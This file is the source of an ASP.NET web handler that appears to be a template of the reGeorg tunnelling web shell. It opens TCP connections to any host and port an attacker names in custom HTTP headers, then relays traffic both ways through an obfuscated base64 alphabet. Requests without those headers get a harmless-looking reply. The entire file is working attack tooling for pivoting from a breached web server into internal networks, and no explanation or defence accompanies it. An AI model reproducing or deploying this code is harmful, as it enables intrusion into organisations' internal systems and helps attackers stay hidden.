<%@ WebHandler Language="C#" Class="GenericHandler1" %>

using System;
using System.Web;
using System.Net;
using System.Net.Sockets;

public class GenericHandler1 : IHttpHandler, System.Web.SessionState.IRequiresSessionState {
    public String StrTr(string input, string frm, string to) {
        String r = "";
        for(int i=0; i < input.Length; i++) {
            int index = frm.IndexOf(input[i]);
            if(index != -1)
                r += to[index];
            else
                r += input[i];
        }
        return r;
    }
    public void ProcessRequest (HttpContext context) {
        try {
            context.Response.StatusCode = HTTPCODE;
            String en = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
            String de = "BASE64 CHARSLIST";
            String cmd = context.Request.Headers.Get("X-CMD");
            if (cmd != null) {
                String mark = cmd.Substring(0,22);
                cmd = cmd.Substring(22);
                if (cmd == "CONNECT") {
                    try {
                        String target_str = System.Text.Encoding.Default.GetString(Convert.FromBase64String(StrTr(context.Request.Headers.Get("X-TARGET"), de, en)));
                        String[] target_ary = target_str.Split('|');
                        String target = target_ary[0];
                        int port = int.Parse(target_ary[1]);
                        IPAddress ip;
                        try {
                            ip = IPAddress.Parse(target);
                        } catch (Exception ex) {
                            IPHostEntry host = Dns.GetHostByName(target);
                            ip = host.AddressList[0];
                        }
                        System.Net.IPEndPoint remoteEP = new IPEndPoint(ip, port);
                        Socket sender = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                        sender.Connect(remoteEP);
                        sender.Blocking = false;
                        context.Session[mark] = sender;
                        context.Response.AddHeader("X-STATUS", "OK");
                    } catch (Exception ex) {
                        context.Response.AddHeader("X-ERROR", "Failed connecting to target");
                        context.Response.AddHeader("X-STATUS", "FAIL");
                    }
                } else if (cmd == "DISCONNECT") {
                    try {
                        Socket s = (Socket)context.Session[mark];
                        s.Close();
                    } catch (Exception ex) {
                    }
                    context.Session.Remove(mark);
                } else if (cmd == "FORWARD") {
                    Socket s = (Socket)context.Session[mark];
                    try {
                        int buffLen = context.Request.ContentLength;
                        byte[] buff = new byte[buffLen];
                        int c = 0;
                        while ((c = context.Request.InputStream.Read(buff, 0, buff.Length)) > 0) {
                            string b64 = StrTr(System.Text.Encoding.Default.GetString(buff), de, en);
                            s.Send(Convert.FromBase64String(b64));
                        }
                        context.Response.AddHeader("X-STATUS", "OK");
                    } catch (Exception ex) {
                        context.Response.AddHeader("X-ERROR", "POST request read filed");
                        context.Response.AddHeader("X-STATUS", "FAIL");
                    }
                } else if (cmd == "READ") {
                    try {
                        Socket s = (Socket)context.Session[mark];
                        int c = 0;
                        byte[] readBuff = new byte[513];
                        try {
                            while ((c = s.Receive(readBuff)) > 0) {
                                byte[] newBuff = new byte[c];
                                System.Buffer.BlockCopy(readBuff, 0, newBuff, 0, c);
                                string b64 = Convert.ToBase64String(newBuff);
                                context.Response.BinaryWrite(System.Text.Encoding.Default.GetBytes(StrTr(b64, en, de)));
                            }
                            context.Response.AddHeader("X-STATUS", "OK");
                        } catch (SocketException ex) {
                            context.Response.AddHeader("X-STATUS", "OK");
                        }

                    } catch (Exception ex) {
                        context.Response.AddHeader("X-STATUS", "OK");
                    }
                }
            } else {
                context.Session["l"]=true;
                context.Response.Write("Georg says, 'All seems fine'");
            }
        } catch (Exception ex) {
            context.Response.AddHeader("X-STATUS", "FAIL");
        }
    }

    public bool IsReusable {
        get {
            return false;
        }
    }
}
